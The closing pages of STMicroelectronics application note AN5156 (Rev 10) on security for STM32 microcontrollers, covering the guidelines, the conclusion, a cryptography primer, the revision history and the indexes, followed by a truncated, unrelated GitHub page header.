4.7 Uniquely authenticate a device.

•

Embed a device private key and its certificate in the device, and exchange encrypted message.

4.8 Authenticate communication servers.

•
•

Embed a shared encryption key in the device, and exchange encrypted message.
Embed server public key in the device, and exchange encrypted message.

AN5156 - Rev 10

page 45/59

AN5156
Conclusion

8

Conclusion

No system can be made secure by simply enabling security features in the hardware. Security must be rooted
in the architecture of the complete solution.
The threats must be identified, the countermeasures correctly designed and implemented in synergy with other
security features.
As security demands considerable resources, it is important to correctly evaluate the risks, and spend
the resources efficiently, keeping in mind the cost of attack and the value of the protected asset.
The concept of root of trust is pivotal because it uses a more hierarchic and centralized approach, as opposed to
attempting to apply security ad hoc.
With the STM32 microcontrollers, the embedded and IoT security is very cost-effective and robust.

AN5156 - Rev 10

page 46/59

AN5156
Cryptography - Main concepts

Appendix A  Cryptography - Main concepts

Integrity, authentication, and confidentiality

The objectives of cryptography are threefold:

•
•
•

Confidentiality: protection of sensitive data against unauthorized read accesses
Authentication: guarantee of the message sender identity
Integrity: detection of any message corruption during transmission

To meet these objectives, all secure data flows rely on more or less complex combinations of the below
algorithms:

•
•
•

Secret key/symmetric cryptography
Public key/asymmetric cryptography
Hashing

These algorithms are described in this appendix.

A.1

Secret key algorithms

This family of algorithms ensures confidentiality by ciphering a clear plain text with a secret key shared between
the transmitter and the receiver. This technique is referred to as symmetric cryptography because the same key is
used for ciphering and deciphering.

Figure 15. Symmetric cryptography

John Doe1

John Doe2

Secret key

Secret key

1
V
5
5
9
0
5
T
D

The inherent weakness of these algorithms is the key sharing between both parties. It may not be an issue in
secure environments (such as manufacturing plants), but when both parties are distant, the key transfer becomes
a challenge.
Among all secret key algorithms, block-based algorithms are very common since they can be efficiently
accelerated by hardware or software parallel implementations. Typical AES (advanced encryption standard)
algorithms operate on clear blocks of 128 bits. They produce ciphered blocks of the same length using keys
of 128, 192, or 256 bits. The different ways to chain consecutive blocks are called “mode of operations”. They
include cipher block chaining (CBC), counter mode (CTR) and Galois counter mode (GCM).
Since these algorithms are deterministic, they always mix input data with a random value, known as nonce, used
only for one session as initialization vector.

AN5156 - Rev 10

page 47/59

AN5156
Cryptography - Main concepts

A.2

Public key algorithms (PKA)

This class of algorithms is based on a pair of keys. One key, the private one, is never exchanged with any remote
system, while the other key, the public one, can be shared with any party. The relationship between both keys is
asymmetric (asymmetric cryptography):

•

A message encrypted by the private key can be read by any party with the public key. This mechanism
ensures a strong authentication of the sender since the private key has never been shared. Digital
signatures are based on this mechanism.

Figure 16. Signature

John Doe1

Private key A

Only John Doe1 can read this.

Private key A

John Doe2

Private key A

John Doe3

•

A message encrypted by the public key can only be read by the private key owner.

Figure 17. PKA encryption

John Doe1

Private key A

Only John Doe1 can read this.

Private key A

John Doe2

Private key A

John Doe3

The main use of public key algorithms is authentication. It is also used to resolve the “key sharing” issue of
symmetric cryptography. However, this comes at the cost of more complex operations, increased computation
time and bigger memory footprint.
RSA and elliptic curve cryptography (ECC) are the most common asymmetric algorithms.

Hybrid cryptography

Common secure transfer protocols (such as Bluetooth and TLS) rely on both algorithm types. This scheme is
known as hybrid cryptography:

•

•

Asymmetric cryptography is used first, in order to solve the symmetric key-sharing problem. A session key
is exchanged by the public key owner to the private key owner.
Transfer confidentiality is then provided by a symmetric algorithm using the session key.

1
V
6
5
9
0
5
T
D

1
V
7
8
9
0
5
T
D

AN5156 - Rev 10

page 48/59

AN5156
Cryptography - Main concepts

A.3

Hash algorithms

Hash algorithms guarantee the message integrity. They generate a unique fixed-length bitstream from a message
called the digest. Any difference in the input message produces a totally different digest. The digest cannot be
reversed to retrieve the input message.
Hashing can be used independently from message encryption.

Figure 18. Message hashing

Message

HASH

John Doe1

HASH

Digest

=?

John Doe2

1
V
8
5
9
0
5
T
D

The difference with classic CRC is the robustness due to operations that are more complex and a much higher
digest length: up to 512 bits instead of 16 or 32 bits. As an example, CRC are reserved for fast integrity checks
during data transfers. Digest length makes them virtually unique and ensures that no collision occurs.
Typical algorithms are the MD5 (128-bit digest), SHA-1 (160-bit digest), SHA-2 (224-, 256-,384-, or 512-bit
digest), and SHA-3 (224-, 256-, 384-, or 512-bit digest).

A.4

MAC or signature and certificate

MAC and signature

The message authentication code (MAC) and the signature add authentication to integrity by encrypting the
message hash. The difference between MAC and signature is that the MAC generation uses a symmetric key
algorithm (Figure 19), while the signature uses the message sender private key (Figure 20).
The signature adds non-repudiation dimension to authentication:

•

•

A private key is not supposed to be revoked (its lifetime goes beyond the transfer operation), while a secret
key may have a limited lifetime (limited to this transfer).
The private key used for signature is never shared, its security is higher than a secrete key.

Figure 19. MAC generation with secrete key algorithm

Message

HASH

John Doe1

HASH

Digest

=?

John Doe2

Secret
key

Secret
key

MAC

MAC

MAC

1
V
9
5
9
0
5
T
D

AN5156 - Rev 10

page 49/59

AN5156
Cryptography - Main concepts

Figure 20. Signature generation with public key algorithm

Message

HASH

John Doe1

HASH

Digest

=?

John Doe2

Private
key

Public
key

Signature

Signature

Signature

1
V
0
6
9
0
5
T
D

Certificate

A certificate is related to public key algorithms. It authenticates the public key in an asymmetric transfer. It is used
to counteract usurpation by an attacker that substitutes the right public key by his own key. A certificate consists
in the public key signed by a certificate authority (CA) private key. This CA is considered as fully trusted.
In addition to the public key, the certificate also contains version numbers, validity period and some IDs.

AN5156 - Rev 10

page 50/59

AN5156

Revision history

Date

Version

Changes

Table 17. Document revision history

17-Oct-2018

25-Feb-2019

1

2

Initial release.

Updated:

•
•
•
•
•

Table 1. Applicable products
Section 1 General information
Table 11. Security features for STM32H7, STM32G0, STM32G4 and STM32WB Series
Figure 9. Example of RDP protections (STM32L4 Series)
Section 6.6 Firewall

Added:

•

Section 6.8 Cryptographic key storage (CKS)

Updated:

•
•
•
•
•
•
•
•
•
•
•
•
•
•
•
•

Table 1. Applicable products
Section "Introduction" renamed "Overview"
Table 2. Glossary
Section "Hardware protections" renamed "Device protections"
Figure 4. Memory types
Table 5. Memory types and associated protection
Section 4.2.4 External Flash memories
Table 6. Scope of STM32 embedded memories protection features
Table 7. Software isolation mechanism
Section 4.5 Boot protection
Section 5 Secure applications: Table 9, Table 10 and Table 11
Section 6.2 Readout protection (RDP)
Section 6.7 Secure hide protection (HDP)
Section 6.17 Cryptography
Section 7 Guidelines
Some colors removed on all figures

Added:

•
•
•

•
•
•
•
•
•
•
•

Section 4.1 TrustZone® for Armv8-M architecture
Section 6.4 TrustZone
Section 6.18 On-the-fly decryption engine (OTFDEC)

Updated Section Introduction
Added acronyms in Table 2. Glossary
Updated Section 2 Overview and Section 3 Attack types
Restructured Section 3.4 IoT system attack examples (added Section 3.5 List of attack targets)
Updated Section 4 Device protections
Updated and restructured Section 5 Secure applications
Added Section 5.3 Arm TF-M solution
Updated Section 6 STM32 security features, Section 7 Guidelines and Section 8 Conclusion

Updated:

•
•
•
•
•
•

Document's scope to add STM32WL Series
Table 1. Applicable products
Section 1 General information
Section 3.1 Introduction to attack types
Section 3.2 Software attacks
Section 3.3.1 Non-invasive attacks

7-Oct-2019

3

21-Feb-2020

4

06-Nov-2020

5

AN5156 - Rev 10

page 51/59

AN5156

Date

Version

Changes

06-Nov-2020

5 (cont'd)

07-Jul-2021

6

13-Jan-2023

7

22-Mar-2023

8

Updated:

•
•
•
•
•
•
•
•

Section 3.3.2 Silicon invasive attacks
Section 4.1 TrustZone® for Armv8-M architecture
Table 5. Memory types and associated protection
Section 5.3 Arm TF-M solution
Table 8. Basic feature differences
Section 6.1 Security features overview including updates in all the tables
Section 6.2 Readout protection (RDP)
Section 6.4 TrustZone

Added:

•
•

Section 4.2 Dual-core security
Section 6.3 One-time programmable (OTP)

Updated:

•
•
•
•
•
•
•
•
•
•
•
•
•
•
•
•

Document's scope to add STM32U5 Series
Table 1. Applicable products
Section 3.3.1 Non-invasive attacks
Section 4.3.3 Embedded SRAM
Section 4.3.4 External Flash memories
Section 5 Secure applications
Table 9. Security features for STM32Fx Series
Table 10. Security features for STM32Lx and STM32U5 Series
Table 11. Security features for STM32H7, STM32G0, STM32G4, STM32WB and STM32WL Series
Section 6.3 One-time programmable (OTP)
Section 6.6 Execute-only firmware (PCROP)
Section 6.8 Firewall
Section 6.9 Memory protection unit (MPU)
Section 6.17 Cryptography
Section 6.17.1 Hardware accelerators
Section 6.17.2 CryptoLib software library

Added:

•

Section 5.4 Product certifications

Updated:

•
•
•
•
•
•
•
•
•
•
•
•

Document scope to add STM32C0 and STM32H5 Series
Section 1 General information
Debug port access and SCA in Section 3.3.1 Non-invasive attacks
Random number generation and Communication eavesdrop in Section 3.5 List of attack targets
New Section 4.1 Configuration protection
Introduction of Section 5.2 ST proprietary SBSFU solution
New Section 5.2.3 Configurations
Section 5.3 Arm TF-M solution
Section 6.1 Overview of security features
Last note in Section 6.2 Readout protection (RDP)
New Section 6.3 Lifecycle management – product state
Section 6.7 Execute-only firmware (PCROP)

Updated:

•
•
•
•
•
•
•
•
•
•
•
•
•

Section 1 General information
Section 4.1 Configuration protection
Section 4.2 TrustZone® for Armv8-M architecture
Table 6. Scope of STM32 embedded memory protection features
Table 7. Software isolation mechanism
Section 5.4 Arm TF-M solution
Section 5.5 Product certifications
Table 9. Security features for STM32C0, STM32F0/1/2/3/4, STM32G0/4 devices
Section 6.2 Readout protection (RDP)
Section 6.5 TrustZone®
Section 6.7 Execute-only firmware (PCROP)
Section 6.12 Antitamper (TAMP)/backup registers (BKP)
Section 6.18 Cryptography

AN5156 - Rev 10

page 52/59

AN5156

Date

Version

Changes

•
•

Section 7 Guidelines
Section 8 Conclusion

Added:

•

Section 5.1 Secure firmware install (SFI)

Updated:

13-Oct-2023

9

•
•
•
•
•

•

Table 4. Attacks types and costs
Section 5.6: Product certifications
Section 6.3: Lifecycle management–product state
Section 6.9: Secure hide protection (HDP)
STM32WBA added to Table 11. Security features for STM32L0/1/4/4+, STM32WB, STM32WBA,
STM32WL devices
STM32H7R/S added to Table 12. Security features for STM32L5, STM32U5, STM32H503/

11-Mar-2024

10

Added:

•

Section 5.5: Secure manager

Updated:

•

•

•
•
•
•
•
•
•
•

Document title from Introduction to STM32 microcontrollers security to Introduction to security for
STM32 MCUs.
Added STM32U0 Series and STM32WB0 Series to the document scope and updated
Table 1. Applicable products.
Added footnotes to Hardware crypto row on Table 10, Table 11 and Table 12.
Table 11: added STM32WB0x column.
Table 12: table header, RNG row, added STM32U0 column.
RDP level regression.
Section 6.3: Lifecycle management–product state: main available product states list.
Section 6.9: Secure hide protection (HDP) inlcuding Figure 10. HDP protected firmware access.
Note on When to use the firewall.
Section 6.19.1: Hardware accelerators: added note.

Added:

•
•

Regression locked by OEM keys
Section 6.4: Unique boot entry

AN5156 - Rev 10

page 53/59

AN5156
Contents

Contents

1

2

3

General information . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2

Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .5

2.1

Security purpose . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5

Attack types . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .7

3.1

3.2

3.3

3.4

3.5

Introduction to attack types . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7

Software attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8

Hardware attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9

3.3.1

3.3.2

Non-invasive attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10

Silicon invasive attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11

IoT system attack examples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12

List of attack targets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13

4

Device protections. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .16

4.1

4.2

4.3

4.4

4.5

4.6

4.7

4.8

Configuration protection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16

TrustZone® for Armv8-M architecture . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16

Dual-core architecture . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17

Memory protections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18

4.4.1

4.4.2

4.4.3

4.4.4

4.4.5

System flash memory . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19

User flash memory . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19

Embedded SRAM . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19

External flash memories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20

STM32 memory protections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21

Software isolation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21

Debug port and other interface protection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21

Boot protection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22

System monitoring . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22

5

Secure applications. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .23

5.1

5.2

5.3

5.4

5.5

Secure firmware install (SFI) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23

Root and chain of trust . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23

STMicroelectronics proprietary SBSFU solution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23

5.3.1

5.3.2

5.3.3

Secure boot (SB) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23

Secure firmware update (SFU) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24

Configurations  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25

Arm TF-M solution. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25

Secure manager . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26

AN5156 - Rev 10

page 54/59

AN5156
Contents

5.6

Product certifications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26

6

STM32 security features . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .28

6.1

Overview of security features . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28

6.1.1

6.1.2

Static and dynamic protections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28

Security features by STM32 devices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28

Readout protection (RDP) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31

Lifecycle management–product state . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33

Unique boot entry . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33

One-time programmable (OTP). . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33

TrustZone® . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34

6.6.1

6.6.2

6.6.3

Core state . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34

Secure attribution unit (SAU). . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34

Memory and peripheral protections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35

Flash memory write protection (WRP) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35

Execute-only firmware (PCROP). . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35

Secure hide protection (HDP) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36

6.2

6.3

6.4

6.5

6.6

6.7

6.8

6.9

6.10

Firewall . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37

6.11 Memory protection unit (MPU). . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38

6.12 Customer key storage (CKS) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 39

6.13 Antitamper (TAMP)/backup registers (BKP). . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40

6.14 Clock security system (CSS) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40

6.15 Power monitoring (PVD). . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40

6.16 Memory integrity hardware check . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41

6.17

Independent watchdog (IWDG) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41

6.18 Device ID . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41

6.19 Cryptography . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41

6.19.1

Hardware accelerators . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 42

6.19.2

CryptoLib software library . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 42

6.20 On-the-fly decryption engine (OTFDEC) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 42

Guidelines. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .44

Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .46

7

8

Appendix A Cryptography - Main concepts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .47

A.1

A.2

A.3

Secret key algorithms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 47

Public key algorithms (PKA) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48

Hash algorithms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49

A.4 MAC or signature and certificate . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49

AN5156 - Rev 10

page 55/59

Revision history . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .51

AN5156
Contents

AN5156 - Rev 10

page 56/59

AN5156
List of tables

List of tables

Table 1.   Applicable products . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1
Table 2.   Glossary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2
Table 3.   Assets to be protected . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6
Table 4.   Attacks types and costs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8
Table 5.   Memory types and associated protection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18
Table 6.   Scope of STM32 embedded memory protection features . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21
Table 7.   Software isolation mechanism . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21
Table 8.   Basic feature differences of TrustZone-based secure software . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
Table 9.   Certifications coverage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27
Table 10.   Security features for STM32C0, STM32F0/1/2/3/4, STM32G0/4 devices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28
Table 11.   Security features for STM32L0/1/4/4+, STM32WB, STM32WBA, STM32WB0x, STM32WL devices . . . . . . . . . . 29
Table 12.   Security features for STM32L5, STM32U0, STM32U5, STM32H503/5, STM32H7R/S, STM32H72x/73/74x/75,

STM32H7Ax/7Bx, STM32F7 devices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 30
Table 13.   RDP protections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32
Table 14.   Attributes and access permission managed by MPU. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 39
Table 15.   Process isolation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 39
Table 16.   Security use cases . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 44
Table 17.   Document revision history . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 51

AN5156 - Rev 10

page 57/59

AN5156
List of figures

List of figures

Corrupted connected device threat . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5
Figure 1.
IoT system . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12
Figure 2.
Armv8-M TrustZone® execution modes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17
Figure 3.
Figure 4.
Simplified diagram of dual-core system architecture . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17
Figure 5.   Memory types. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18
Secure boot FSM . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24
Figure 6.
Secure server/device SFU architecture . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25
Figure 7.
Figure 8.
Example of RDP protections (STM32L4 series). . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31
TrustZone® implementation at system level . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34
Figure 9.
Figure 10.   HDP protected firmware access . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36
Figure 11.   Firewall FSM . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37
Figure 12.   Firewall application example. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38
Figure 13.   Dual-core architecture with CKS service  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40
Figure 14.   Typical OTFDEC configuration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43
Figure 15.   Symmetric cryptography . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 47
Figure 16.   Signature . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48
Figure 17.   PKA encryption. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48
Figure 18.   Message hashing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49
Figure 19.   MAC generation with secrete key algorithm . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49
Figure 20.   Signature generation with public key algorithm . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 50

AN5156 - Rev 10

page 58/59

AN5156

IMPORTANT NOTICE – READ CAREFULLY

STMicroelectronics NV and its subsidiaries (“ST”) reserve the right to make changes, corrections, enhancements, modifications, and improvements to ST
products and/or to this document at any time without notice. Purchasers should obtain the latest relevant information on ST products before placing orders. ST
products are sold pursuant to ST’s terms and conditions of sale in place at the time of order acknowledgment.

Purchasers are solely responsible for the choice, selection, and use of ST products and ST assumes no liability for application assistance or the design of
purchasers’ products.

No license, express or implied, to any intellectual property right is granted by ST herein.

Resale of ST products with provisions different from the information set forth herein shall void any warranty granted by ST for such product.

ST and the ST logo are trademarks of ST. For additional information about ST trademarks, refer to www.st.com/trademarks. All other product or service names
are the property of their respective owners.

Information in this document supersedes and replaces information previously supplied in any prior versions of this document.

© 2024 STMicroelectronics – All rights reserved

AN5156 - Rev 10

page 59/59



=== Content from github.com_9dffae70_20250114_204340.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fapache%2Fnuttx%2Fpull%2F3292%2Fcommits%2F016873788280ca815ba886195535bbe601de6e48)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
